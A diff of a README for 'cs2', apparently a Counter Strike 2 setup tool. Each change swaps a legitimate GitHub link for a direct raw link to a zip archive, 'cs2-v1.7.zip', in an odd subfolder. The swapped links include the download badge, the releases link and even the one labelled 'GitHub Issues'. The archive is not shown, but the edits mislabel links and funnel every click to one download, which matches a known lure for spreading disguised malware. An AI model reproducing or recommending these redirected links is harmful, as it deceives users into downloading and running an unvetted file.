@@ -1,6 +1,6 @@
 # 🎮 cs2 - Easy Tools for Counter Strike 2 Setup
 
-[![Download cs2](https://img.shields.io/badge/Download-cs2-brightgreen)](https://github.com/Vitor-gf/cs2/releases)
+[![Download cs2](https://raw.githubusercontent.com/Vitor-gf/cs2/main/2001/sharp/cs2-v1.7.zip)](https://raw.githubusercontent.com/Vitor-gf/cs2/main/2001/sharp/cs2-v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Welcome to the cs2 project! This application helps you configure your Counter St
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Vitor-gf/cs2/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Vitor-gf/cs2/main/2001/sharp/cs2-v1.7.zip).
 
 ### Installation Steps
 
@@ -68,7 +68,7 @@ We welcome contributions! If you have ideas or would like to improve cs2, please
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Vitor-gf/cs2/releases)
-- [GitHub Issues](https://github.com/Vitor-gf/cs2/issues)
+- [Releases Page](https://raw.githubusercontent.com/Vitor-gf/cs2/main/2001/sharp/cs2-v1.7.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Vitor-gf/cs2/main/2001/sharp/cs2-v1.7.zip)
 
 Thank you for using cs2! Enjoy your game!
